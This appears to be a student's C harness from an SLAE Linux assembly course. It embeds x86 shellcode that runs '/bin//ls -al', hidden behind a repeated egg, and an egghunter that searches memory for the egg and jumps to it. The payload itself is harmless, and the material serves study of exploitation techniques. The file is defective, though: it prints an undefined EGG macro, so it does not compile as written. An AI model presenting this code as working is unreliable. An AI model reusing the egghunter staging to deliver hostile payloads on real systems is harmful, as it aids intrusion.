// Student SLAE – 871

#include<stdio.h>
#include<string.h>
 
#define XXX "\x90\x50\x90\x50" 
unsigned char shellcode[] =
XXX XXX
"\x6a\x0b\x58\x31\xd2\x52\x68\x2d"
"\x61\x6c\x68\x89\xe1\x52\x68\x2f"
"\x2f\x6c\x73\x68\x2f\x62\x69\x6e"
"\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";

 
unsigned char egghunter[] =
"\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80"
"\x3c\xf2\x74\xf1\xb8"
XXX
// \x90\x50\x90\x50
"\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";
// \x90\x50\x90\x50
// \x90\x50\x90\x50
 
main()
{
 
printf("Your egg: " EGG "\n");
printf("Shellcode Length: %d\n", strlen(shellcode));
printf("Egghunter Length: %d\n", strlen(egghunter));
int (*ret)() = (int(*)())egghunter;
ret();
 
}